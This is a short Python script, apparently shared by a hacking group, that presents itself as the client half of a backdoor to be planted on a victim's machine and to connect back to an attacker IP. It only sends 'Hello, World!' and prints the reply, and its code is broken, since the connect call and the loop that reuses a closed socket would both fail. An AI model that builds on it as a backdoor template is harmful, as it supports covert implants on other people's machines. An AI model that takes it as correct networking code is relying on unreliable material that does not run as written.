#!/usr/bin/python


###################
##               ## 
##  CLIENT SIDE  ## 
##               ##
###################

'''
    # Description:
    Agent.py - This program is a simple backdoor which planted im the VICTIM's      machin, and send an ECHO back to the server.

    # Terms Of Use : 
      This project is owned by Hacking|Pentesting Group on Facebook 
      ( https://www.facebook.com/groups/1740722166239140/ ) for learning 
      purposes uses only!
      Therefore, the admins, moderators and authors do not hold any legal 
      actions of whom is going to use this program in ilegal way.

'''


import socket   # to create a socket
import sys      # to close the program


# Globals:
##########

# The remote host / Attacker IP
HOST = '192.168.0.199' 
# The same port as used by the server
PORT = 50007
# Initialize teh SOCKET Object
sock = socket.socket( socket.AF_INET , socket.SOCK_STREAM )



# MAIN 
while 1: # 1 = True , 0 = False
    # Connect to the server using port 50007
    sock.connect( HOST , PORT )
    # Send a message to server
    sock.sendall( 'Hello, World!' )
    # Get response in byte size 1024
    data = sock.recv( 1024 ) 
    # Print the response of the server
    print( '[+] Inccomming data: ', repr( data ) )
    # Close the connection
    sock.close()
# Exiting the loop and program
print( '[x] Exiting...' )
sys.exit()




